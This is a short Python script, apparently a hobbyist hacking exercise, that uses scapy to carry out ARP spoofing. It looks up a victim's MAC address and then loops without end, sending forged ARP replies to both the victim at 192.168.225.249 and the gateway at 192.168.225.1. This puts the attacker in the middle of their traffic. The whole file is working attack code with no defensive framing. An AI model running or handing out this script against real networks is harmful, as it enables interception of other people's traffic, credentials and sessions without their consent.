import scapy.all as scapy
import time

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_ether_packet =scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast_ether_packet/arp_request_packet
    answered_list = scapy.srp(arp_request_broadcast,timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def arp_spoof(target_victim_ip, spoof_ip):
    target_victim_mac_address= get_mac_address(target_victim_ip)
    print(target_victim_mac_address)
    arp_packet = scapy.ARP(op=2,pdst=target_victim_ip,hwdst=target_victim_mac_address,psrc=spoof_ip)
    #scapy.ls(arp_packet)
    #print(arp_packet.summary())
    #print(arp_packet.show())
    scapy.send(arp_packet)
sent_packets_count=0

while True:
    arp_spoof("192.168.225.249","192.168.225.1")
    arp_spoof("192.168.225.1","192.168.225.249")
    sent_packets_count=sent_packets_count+3
    print("\r[*]--Sent packets:"+ str(sent_packets_count),end="")
    time.sleep(3)
